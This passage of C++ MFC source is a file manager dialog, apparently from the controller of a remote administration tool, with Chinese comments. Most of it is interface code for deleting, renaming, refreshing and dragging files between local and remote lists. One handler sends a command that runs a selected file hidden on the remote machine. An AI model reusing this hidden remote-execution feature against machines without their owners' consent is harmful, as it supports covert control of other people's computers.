	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
}



void CFileManagerDlg::OnRemoteOpenHide()																						//远程运行隐藏
{
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int		nPacketLength = str.GetLength() + 2;
	BYTE	lpPacket[MAX_PATH+10];
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////共享功能

void CFileManagerDlg::OnDelete()                                                                          //菜单删除功能
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnIdtLocalDelete();
	}
	else
	{
		OnIdtRemoteDelete();
	}		
}

void CFileManagerDlg::OnNewfolder()                                                                       //菜单添加目录功能
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnIdtLocalNewfolder();
	}
	else
	{
		OnIdtRemoteNewfolder();  
	}
}



void CFileManagerDlg::OnRename()																	      //菜单重命名功能
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		m_list_local.EditLabel(m_list_local.GetSelectionMark());
	}
	else
	{
		m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
	}	
}



void CFileManagerDlg::OnRefresh()																	      //菜单的刷新功能
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		FixedLocalFileList(".");
	}
	else
	{
		GetRemoteFileList(".");
	}		
}


void CFileManagerDlg::OnTransfer()																		  //菜单的传输功能
{
	
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnIdtLocalCopy();
	}
	else
	{
		OnIdtRemoteCopy();     
	}
}




   int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
		(
		lpFileName,
		dwFileAttributes, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
		);

	return sfi.iIcon;
}


void CFileManagerDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
	m_list_local.EnableWindow(bEnable);
	m_list_remote.EnableWindow(bEnable);
	m_Local_Directory_ComboBox.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}



void CFileManagerDlg::ShowProgress()     //yi   da   yi  iu  jhjdk  o  dkfjk  o  dfkj
{
	char	*lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "传送文件";
	else
		lpDirection = "接收文件";


	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;  //5      100 
	}



	//10  /2  /3
	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;     //文件总长
	m_ProgressCtrl->SetPos(progress);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// 关闭文件句柄
	}
}








//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////文件的拖拉拽

void CFileManagerDlg::OnLvnBegindragListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	m_nDragIndex = pNMListView->iItem;   //保存要拖的项

	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;

	

	if(m_list_local.GetSelectedCount() > 1) //变换鼠标的样式  如果选择多项进行拖拽
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor); 
	

	
	m_bDragging = TRUE;	
	m_nDropIndex = -1;	
	m_pDragList = &m_list_local; 
	m_pDropWnd = &m_list_local;	

	SetCapture();   //捕获鼠标消息
	*pResult = 0;
}


void CFileManagerDlg::OnLvnBegindragListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;

	m_nDragIndex = pNMListView->iItem;
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;	


	

	if(m_list_remote.GetSelectedCount() > 1)
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor); 
	
	
	m_bDragging = TRUE;	
	m_nDropIndex = -1;	
	m_pDragList = &m_list_remote;     //取
	m_pDropWnd = &m_list_remote;
	SetCapture ();

	*pResult = 0;
}


void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)    //  ListCtrl   +   
{
	
	if (m_bDragging)    //我们只对拖拽感兴趣  
	{	
		
		CPoint pt(point);	
		ClientToScreen(&pt);   //屏幕

		
		//根据鼠标获得窗口句柄
		CWnd* pDropWnd = WindowFromPoint (pt);   //屏幕  位置 是 窗口句柄

		ASSERT(pDropWnd);
		
		m_pDropWnd = pDropWnd;   //放 

	
		if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl)))   //属于我们的窗口范围内
		{			

			SetCursor(m_hCursor);  //拷贝

		//	if (m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)   //在我们自己的窗口中就退出
		//		return;
		}
		else
		{
			
			SetCursor(LoadCursor(NULL, IDC_NO));   //超出窗口换鼠标样式
		}
	}	
	CDialog::OnMouseMove(nFlags, point);
}


void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)    //   ben  mu 
{
	if (m_bDragging)
	{
	
		ReleaseCapture();  //释放鼠标的捕获

		
		m_bDragging = FALSE;

		CPoint pt (point);    //获得当前鼠标的位置相对于整个屏幕的
		ClientToScreen (&pt); //转换成相对于当前用户的窗口的位置    //kong zhuang  biang    20

		//ScreenToClient()
		
		CWnd* pDropWnd = WindowFromPoint (pt);   //获得当前的鼠标下方有无控件  SeverList        ClientList   BeginDrag   
		ASSERT (pDropWnd);
	


		if (pDropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl))) //如果是一个ListControl
		{
			m_pDropList = (CListCtrl*)pDropWnd;       //保存当前的窗口句柄
			
			
			
			DropItemOnList(m_pDragList, m_pDropList); //处理传输
		}
	}	
	CDialog::OnLButtonUp(nFlags, point);
}



void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)   
{


	if(pDragList == pDropList)    //如果是自己退出
	{
		return;
	} 

	if ((CWnd *)pDropList == &m_list_local)
	{
		OnIdtRemoteCopy();      //向本地拷贝
	}
	else if ((CWnd *)pDropList == &m_list_remote)
	{
		OnIdtLocalCopy();      //向远程拷贝
	}
	else
	{
		return;
	}
	// 重置
	m_nDropIndex = -1;
}




void CFileManagerDlg::OnCbnSelchangeRemotePath()
{
	// TODO: 在此添加控件通知处理程序代码

	GetRemoteFileList();
}
